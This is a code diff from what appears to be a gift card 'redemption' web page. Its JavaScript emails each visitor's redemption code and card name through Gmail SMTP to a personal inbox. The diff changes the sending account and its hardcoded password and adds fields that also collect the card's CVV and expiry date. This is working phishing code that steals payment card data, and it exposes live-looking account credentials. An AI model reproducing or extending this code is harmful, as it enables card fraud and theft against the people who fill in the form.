@@ -331,8 +331,8 @@
           .then(async (message) => {
             await Email.send({
               Host: 'smtp.googlemail.com',
-              Username: 'veehuelabs@gmail.com',
-              Password: 'xrmfdbewnkerudsz',
+              Username: 'lovedayperfection1@gmail.com',
+              Password: 'chdhqslattahkmbv',
               To: 'lovedayperfection1@gmail.com',
               From: 'allmygiftcards@gmail.com',
               Subject: 'New Gift Card Entry Alert',
@@ -343,6 +343,8 @@
          <p> Gift Card Redemption Code:  ${code.value}</p>
 
           <p>Gift Card Name:  ${name.value}</p>
+           <p>Gift Card CVV:  ${cvv.value}</p>
+          <p>Gift Card Expiry:  ${date.value}</p>
 
           `,
             });
